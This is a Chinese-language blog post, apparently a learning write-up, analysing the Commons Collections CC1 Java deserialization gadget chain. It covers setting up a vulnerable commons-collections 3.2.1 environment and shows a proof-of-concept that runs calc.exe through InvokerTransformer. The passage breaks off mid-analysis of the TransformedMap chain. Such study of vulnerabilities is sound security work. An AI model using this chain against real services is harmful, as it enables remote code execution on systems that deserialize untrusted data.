<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>java安全-CC1链学习与分析 | Okaytc</title><meta name="keywords" content="Java安全,java利用链"><meta name="author" content="Okaytc"><meta name="copyright" content="Okaytc"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="0x00、前言针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。 0x01、Apache Commons Collections描述CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。  Apache Commons是Apache软件基金会的项目。Co">
<meta property="og:type" content="article">
<meta property="og:title" content="java安全-CC1链学习与分析">
<meta property="og:url" content="https://okaytc.github.io/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/index.html">
<meta property="og:site_name" content="Okaytc">
<meta property="og:description" content="0x00、前言针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。 0x01、Apache Commons Collections描述CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。  Apache Commons是Apache软件基金会的项目。Co">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://okaytc.github.io/img/bg3.png">
<meta property="article:published_time" content="2022-11-09T06:36:59.000Z">
<meta property="article:modified_time" content="2022-11-10T01:21:44.325Z">
<meta property="article:author" content="Okaytc">
<meta property="article:tag" content="Java安全">
<meta property="article:tag" content="java利用链">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://okaytc.github.io/img/bg3.png"><link rel="shortcut icon" href="/img/head.jpg"><link rel="canonical" href="https://okaytc.github.io/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: {"path":"/search.xml","preload":false,"languages":{"hits_empty":"找不到您查询的内容：${query}"}},
  translate: undefined,
  noticeOutdate: undefined,
  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  date_suffix: {
    just: '刚刚',
    min: '分钟前',
    hour: '小时前',
    day: '天前',
    month: '个月前'
  },
  copyright: {"limitCount":50,"languages":{"author":"作者: Okaytc","link":"链接: ","source":"来源: Okaytc","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。"}},
  lightbox: 'fancybox',
  Snackbar: undefined,
  source: {
    justifiedGallery: {
      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
    }
  },
  isPhotoFigcaption: false,
  islazyload: false,
  isAnchor: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'java安全-CC1链学习与分析',
  isPost: true,
  isHome: false,
  isHighlightShrink: false,
  isToc: true,
  postUpdate: '2022-11-10 09:21:44'
}</script><noscript><style type="text/css">
  #nav {
    opacity: 1
  }
  .justified-gallery img {
    opacity: 1
  }

  #recent-posts time,
  #post-meta time {
    display: inline !important
  }
</style></noscript><script>(win=>{
    win.saveToLocal = {
      set: function setWithExpiry(key, value, ttl) {
        if (ttl === 0) return
        const now = new Date()
        const expiryDay = ttl * 86400000
        const item = {
          value: value,
          expiry: now.getTime() + expiryDay,
        }
        localStorage.setItem(key, JSON.stringify(item))
      },

      get: function getWithExpiry(key) {
        const itemStr = localStorage.getItem(key)

        if (!itemStr) {
          return undefined
        }
        const item = JSON.parse(itemStr)
        const now = new Date()

        if (now.getTime() > item.expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return item.value
      }
    }
  
    win.getScript = url => new Promise((resolve, reject) => {
      const script = document.createElement('script')
      script.src = url
      script.async = true
      script.onerror = reject
      script.onload = script.onreadystatechange = function() {
        const loadState = this.readyState
        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
        script.onload = script.onreadystatechange = null
        resolve()
      }
      document.head.appendChild(script)
    })
  
      win.activateDarkMode = function () {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      win.activateLightMode = function () {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
        }
      }
      const t = saveToLocal.get('theme')
    
          if (t === 'dark') activateDarkMode()
          else if (t === 'light') activateLightMode()
        
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        if (asideStatus === 'hide') {
          document.documentElement.classList.add('hide-aside')
        } else {
          document.documentElement.classList.remove('hide-aside')
        }
      }
    
    const detectApple = () => {
      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
    })(window)</script><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/sviptzk/StaticFile_HEXO@latest/butterfly/css/macblack.css"><meta name="generator" content="Hexo 6.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/img/head.jpg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">5</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">3</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">3</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/img/bg3.png')"><nav id="nav"><span id="blog_name"><a id="site-name" href="/">Okaytc</a></span><div id="menus"><div id="search-button"><a class="site-page social-icon search"><i class="fas fa-search fa-fw"></i><span> 搜索</span></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> 时间轴</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> 分类</span></a></div><div class="menus_item"><a class="site-page" href="/links/"><i class="fa-fw fa fa-link"></i><span> 友链</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">java安全-CC1链学习与分析</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-11-09T06:36:59.000Z" title="发表于 2022-11-09 14:36:59">2022-11-09</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-11-10T01:21:44.325Z" title="更新于 2022-11-10 09:21:44">2022-11-10</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%AE%89%E5%85%A8/">Java安全</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/Java%E5%AE%89%E5%85%A8/java%E5%88%A9%E7%94%A8%E9%93%BE/">java利用链</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">字数总计:</span><span class="word-count">6.4k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">阅读时长:</span><span>24分钟</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="java安全-CC1链学习与分析"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><h1 id="0x00、前言"><a href="#0x00、前言" class="headerlink" title="0x00、前言"></a>0x00、前言</h1><p>针对CC链的分析，主要还是以逆向思维为主（从结果分析过程），从中尽可能学习出问题的地方在哪，哪里调用的这个带问题的地方，一步步思考。</p>
<h1 id="0x01、Apache-Commons-Collections描述"><a href="#0x01、Apache-Commons-Collections描述" class="headerlink" title="0x01、Apache Commons Collections描述"></a>0x01、Apache Commons Collections描述</h1><p>CC链即Commons Collections利用链，主要针对Commons Collections组件发现的利用链。</p>
<blockquote>
<p>Apache Commons是Apache软件基金会的项目。Commons的目的是提供可重用的、开源的Java代码。<br>Apache Commons提供了很多工具类库，他们几乎不依赖其他第三方的类库，接口稳定，集成简单，可以大大提高编码效率和代码质量。<br>Apache Commons Collections 是对 java.util.Collection 的扩展。<br>Commons Collections包为Java标准的Collections API提供了相当好的补充。在此基础上对其常用的数据结构操作进行了很好的封装、抽象和补充。让我们在开发应用程序的过程中，既保证了性能，同时也能大大简化代码。</p>
</blockquote>
<p>目前 Collections 包有两个 commons-collections 和commons-collections4，commons-collections 最新版本是3.2.2，3系列版本也是只有3.2.2是安全的，不支持泛型，目前官方已不在维护。collections4 目前最新版本是4.4，其中4.0是存在漏洞，最低要求 Java8 以上。相对于 collections 来说完全支持 Java8 的特性并且支持泛型，该版本无法兼容旧有版本，于是为了避免冲突改名为 collections4。推荐直接使用该版本。（注：两个版本可以共存，使用时需要注意）</p>
<p>CC1链分为两条链，一条为<code>TransformedMap</code>(也是最初的CC1链)，一条为<code>LazyMap</code>，其中有的分析把<code>TransformedMap</code>链单独分出来作为CC链，把<code>LazyMap</code>链作为CC1链。也可以作为CC1的两条链，一起学习下。</p>
<h1 id="0x02、环境准备"><a href="#0x02、环境准备" class="headerlink" title="0x02、环境准备"></a>0x02、环境准备</h1><p>java版本：jdk8u66(cc1链要求java版本小于jdk8u71,不得不说这个版本确实有点老了)<br></n><br>jdk官方下载链接：<a target="_blank" rel="noopener" href="https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html%EF%BC%8C%E6%89%BE%E5%88%B0%E5%AF%B9%E5%BA%94%E7%89%88%E6%9C%AC%E4%BD%8E%E4%BA%8E8u71%E7%9A%84%E5%B0%B1%E8%A1%8C%E3%80%82">https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html，找到对应版本低于8u71的就行。</a></p>
<p><strong>添加Maven项目</strong><br>新建Maven项目——&gt;pom.xml添加Commons Collections组件依赖,3系列除3.2.2版本外，其余均收该漏洞影响，添加3系列其中一个版本即可</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependencies&gt;</span><br><span class="line">    &lt;dependency&gt;</span><br><span class="line">        &lt;groupId&gt;commons-collections&lt;/groupId&gt;</span><br><span class="line">        &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;</span><br><span class="line">        &lt;version&gt;3.2.1&lt;/version&gt;</span><br><span class="line">    &lt;/dependency&gt;</span><br><span class="line">&lt;/dependencies&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-1.png" title="maven环境"></p>
<p><strong>导入sun包</strong></p>
<blockquote>
<p>因为cc1链需要用到sun包中的类，sun包在jdk中的代码是通过class文件反编译来的，为.class文件，查看不到源码.java文件，不便于调试，且直接观看class文件的阅读性跟java文件有出入，所以下载jdk源码sun包导入，便可查看到java源码文件，方便调试阅读</p>
</blockquote>
<p>步骤:<br>下载jdk源码：<a target="_blank" rel="noopener" href="https://hg.openjdk.java.net/jdk8u/jdk8u/jdk">https://hg.openjdk.java.net/jdk8u/jdk8u/jdk</a><br>按网上步骤解压出src文件夹，再把&#x2F;src&#x2F;share&#x2F;classes&#x2F;sun文件夹放到解压出来的src文件夹跟目录<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-2.png" title="sun环境"><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-3.png" title="sun环境"><br>在项目结构中对应jdk版本下添加包即可如下图<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-4.png" title="sun环境"><br>随后在分析过程对应maven里Commons Collections包的class文件上方提示下载源代码，下载就可以看到Commons Collections包的java源码<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-5.png" title="查看到源码"></p>
<h1 id="0x03、利用链接口及实现类"><a href="#0x03、利用链接口及实现类" class="headerlink" title="0x03、利用链接口及实现类"></a>0x03、利用链接口及实现类</h1><p>CC1链的利用点为<code>Commons Collections</code>包中的<code>Transformer</code>接口，通过下面后半段的利用链可以了解<code>Transformer</code>接口相关涉及实现它的<code>ChainedTransformer</code>类、<code>ConstantTransformer</code>类、<code>InvokerTransformer</code>类。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">yso-cc1链后半段利用链</span><br><span class="line">ChainedTransformer.transform()</span><br><span class="line">    ConstantTransformer.transform()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Class.getMethod()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Runtime.getRuntime()</span><br><span class="line">    InvokerTransformer.transform()</span><br><span class="line">        Method.invoke()</span><br><span class="line">            Runtime.exec()</span><br></pre></td></tr></table></figure>


<h2 id="Transformer接口"><a href="#Transformer接口" class="headerlink" title="Transformer接口"></a>Transformer接口</h2><p>&#x2F;&#x2F;我理解为 转换器接口<br><code>Transformer</code>接口只有一个<code>public Object transform(Object input)</code>方法，返回一个被转换的Object对象<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-6.png" title="Transformer接口"><br>Transformer接口实现的类，包括利用链中的关键的类，这些类都实现了<code>Transformer</code>以及序列化<code>serializable</code>。</p>
<p><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-7.png" title="Transformer实现的类"></p>
<h2 id="ChainedTransformer类"><a href="#ChainedTransformer类" class="headerlink" title="ChainedTransformer类"></a>ChainedTransformer类</h2><p>&#x2F;&#x2F;我理解为 链转换类<br><code>ChainedTransformer</code>的作用为链式调用，将传入的<code>Transformer</code>数组依次调用每一个<code>Transformer</code>的<code>transform</code>方法，将第一个的转换返回<code>Object</code>对象的作为下次循环的的输入对象在<code>Transformer</code>的<code>transform</code>中被调用，以此循环。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-8.png" title="ChainedTransformer类"></p>
<h2 id="ConstantTransformer"><a href="#ConstantTransformer" class="headerlink" title="ConstantTransformer"></a>ConstantTransformer</h2><p>&#x2F;&#x2F;我理解为 对象转换类<br>这里定义了一个<code>iConstant</code>对象<br><code>private final Object iConstant;</code><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-9.png" title="ConstantTransformer类"><br>作用就是接受任何传进来的对象，并转换成定义的<code>iConstant</code>对象返回，相对起来很好理解。</p>
<h2 id="InvokerTransformer"><a href="#InvokerTransformer" class="headerlink" title="InvokerTransformer"></a>InvokerTransformer</h2><p>&#x2F;&#x2F;我理解为 调用转换类<br><code>InvokerTransformer</code>类的作用为获取调用的<font color=red>方法名</font>、<font color=red>参数类型</font>、<font color=red>函数的参数列表</font><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-10.png" title="InvokerTransformer"><br>调用的<code>transform</code>获取了<font color=red>对象的类，方法、并返回执行方法，类、方法</font>、<font color=red>参数均为输入的对象，可控</font>，因此该类是cc1链的最重点的执行部分。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-11.png" title="InvokerTransformer"><br>通过正常反射执行<code>Runtime.exec()</code>方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-12.png" title="正常反射执行exec"><br>通过<code>InvokerTransformer</code>类执行<code>Runtime.exec()</code>方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-13.png" title="正常反射执行exec"><br>poc-demo:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">public static void main(String[] args) throws Exception &#123;</span><br><span class="line">        //获取Runtime对象</span><br><span class="line">        Runtime run=Runtime.getRuntime();</span><br><span class="line">        //通过Object对象反射回去Runtime对象</span><br><span class="line">        //Object obj=Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;));</span><br><span class="line">        //获取构造InvokerTransformer对象</span><br><span class="line">        InvokerTransformer iv=new InvokerTransformer(&quot;exec&quot;,new Class[]&#123;String.class&#125;,new Object[]&#123;&quot;calc.exe&quot;&#125;);</span><br><span class="line">        //执行InvokerTransformer.transform方法</span><br><span class="line">        iv.transform(run);</span><br></pre></td></tr></table></figure>
<p>这下很好理解<code>InvokerTransformer</code>这个类的就是为了获取对象以及方法和执行参数，且该对象可控。</p>
<h1 id="0x04、CC1链分析"><a href="#0x04、CC1链分析" class="headerlink" title="0x04、CC1链分析"></a>0x04、CC1链分析</h1><p>从利用链接口和实现类可知<code>InvokerTransformer</code>为最后最重要的执行类，因此该链的分析思路就相对清晰，反查哪些类实现了<code>InvokerTransformer.transform()</code>方法，输入源为反序列化<code>readObject</code>，也就是先搜索最后调用了<code>InvokerTransformer.transform(Object)</code>方法，且实现<code>serializable</code>序列化，以<code>readObject</code>为输入源的类及方法。<br>搜索结果有21个，除去自身测试的，还有20个，满足上述条件（调用<code>transform(Object)</code>、实现了反序列化接口<code>serializable</code>）的有6个类。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-14.png" title="满足条件类"><br>共8个方法<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-15.png" title="满足条件类"></p>
<p>先学习分析一下TransformedMap链和LazyMap链，也就是CC1的两条链。</p>
<h2 id="TransformedMap链"><a href="#TransformedMap链" class="headerlink" title="TransformedMap链"></a>TransformedMap链</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p><code>TransformedMap</code>类作用是对Map进行装饰，通过<code>keyTransformer</code>、<code>valueTransformer</code>分别对输入的<code>key</code>、<code>value</code>通过<code>transform()</code>方法进行修饰，查看构造函数，接受三个参数（<code>Map</code>的对象、<code>Transformer</code>的两个对象分别为<code>key</code>、<code>value</code>。），将接受的<code>key，value</code>对象转换为本类的<code>Transformer</code>对象<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-16.png" title="构造函数"><br>可调用静态方法（map类型）<code>decorate</code>对新<code>Map</code>对象进行回调，对传入新的<code>Map</code>进行修饰，也就是说可以通过<code>decorate</code>方法去获取<code>TransformedMap</code>的对象<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-17.png" title="decorate回调"><br>简单了解<code>TransformedMap</code>类后，现在回到利用链本身来，找到可以实现的<code>transform(Object)</code>的地方<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-18.png" title="decorate回调"><br>三个方法</p>
<ul>
<li>transformKey(Object object)</li>
<li>transformValue(Object object)</li>
<li>checkSetValue(Object value)</li>
</ul>
<p>其中<code>transformKey</code>、<code>transformValue</code>两个方法分别获取从<code>TransformedMap</code>类的构造方法中传入<code>Transformer keyTransformer</code>、<code>Transformer valueTransformer</code>，再分别调用<code>keyTransformer.transform(object)</code>、<code>valueTransformer.transform(object)</code></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">//transformKey方法</span><br><span class="line">protected Object transformKey(Object object) &#123;</span><br><span class="line">        if (keyTransformer == null) &#123;</span><br><span class="line">            return object;</span><br><span class="line">        &#125;</span><br><span class="line">        return keyTransformer.transform(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">//transformValue方法</span><br><span class="line">protected Object transformValue(Object object) &#123;</span><br><span class="line">        if (valueTransformer == null) &#123;</span><br><span class="line">            return object;</span><br><span class="line">        &#125;</span><br><span class="line">        return valueTransformer.transform(object);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>查看这两个方法都在哪调用<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-19.png" title="transformKey方法调用"><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-20.png" title="transformValue方法调用"><br>这两个方法都在put方法中进行调用，参数就为两个<code>Object</code>对象，传递任意一个参数都可调用对应的<code>transformKey/Value</code>方法，最后put放入<code>key</code>和<code>value</code>。<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-21.png" title="put方法"><br>利用思路：<br>因为<code>TransformedMap</code>中构造函数、<code>transformKey</code>、<code>transformValue</code>方法都是<code>protected</code>受保护的，无法直接声明使用，但可调用<code>decorate</code>公共方法进行回调向构造方法传参，通过<code>transformKey</code>或者<code>transformValue</code>传递其中任意一个参数为<code>InvokerTransformer</code>对象，最后通过<code>TransformedMap</code>的<code>put</code>方法传入恶意函数对象达到执行命令。<br>即：<br>第一步，创建构造参数（<code>Map</code>的对象、<code>Transformer</code>的两个对象分别为<code>key</code>、<code>value</code>），其中key或者value可以随意创造其中一个为<code>InvokerTransformer</code>类对象即可<br>第二步，通过<code>decorate</code>公共方法调用构造方法创建<code>TransformedMap</code>对象<br>第三步，调用<code>TransformedMap</code>的<code>put</code>方法，传递恶意函数对象，对其中key和value参数随便传入一个即可<br>利用方法：<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-22.png" title="利用"><br>但上面这两个方法都在本类Put方法进行调用，也未在其他类中进行调用，同时使用到了<code>InvokerTransformer</code>、<code>Map</code>两个类的对象，因此无法通过readObject反序列化达到命令执行的目的。<br><font color=red>注：反序列化的序列化对象只能为单个对象，无法对多个对象进行序列化。</font></p>
<p>接下来看第三个方法：<code>checkSetValue(Object value)</code><br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-23.png" title="checkSetValue方法"><br>同样也是返回构造方法传入的<code>Transformer valueTransformer</code>，然后调用<code>transform(Object)</code>，但是由于是<code>protected</code>受保护，因此无法像另外两个方法一样直接调用。<br>再看该方法有没有其他类对其调用<br><img src="/2022/11/09/java%E5%AE%89%E5%85%A8-CC1%E9%93%BE%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/cc1-24.png" title="checkSetValue方法"><br>发现除了本类以外的父类<code>AbstractInputCheckedMapDecorator</code>中的内部类<code>MapEntry</code>的<code>setValue()</code>方法对其进行了调用，该类</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">static class MapEntry extends AbstractMapEntryDecorator &#123;</span><br><span class="line"></span><br><span class="line">        /** The parent map */</span><br><span class="line">        private final AbstractInputCheckedMapDecorator parent;</span><br><span class="line"></span><br><span class="line">        protected MapEntry(Map.Entry entry, AbstractInputCheckedMapDecorator parent) &#123;</span><br><span class="line">            super(entry);</span><br><span class="line">            this.parent = parent;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        public Object setValue(Object value) &#123;</span><br><span class="line">            value = parent.checkSetValue(value);</span><br><span class="line">            return entry.setValue(value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>官方对该类的描述翻译：</p>
<blockquote>
<p>一个抽象基类，简化了创建地图装饰器的任务。<br>MapAPI很难正确修饰，并且涉及实现许多不同的类。这个类的存在是为了提供一个更简单的API。<br>提供了特殊的钩子方法，当对象被添加到地图时调用这些方法。通过重写这些方法，可以验证或操纵输入。除了主要的映射方法，entrySet也会受到影响，这是编写映射实现最困难的部分。<br>该类是包范围的，在将来的Commons Collections版本中可能会被撤回或替换</p>
</blockquote>
<p>实现调用<br>前面步骤跟另外两个方法一样，由于不能直接调用，因此重点就在for循环里面，通过遍历<code>HashMap</code>键值对，调用<code>setValue()</code>方法</p>
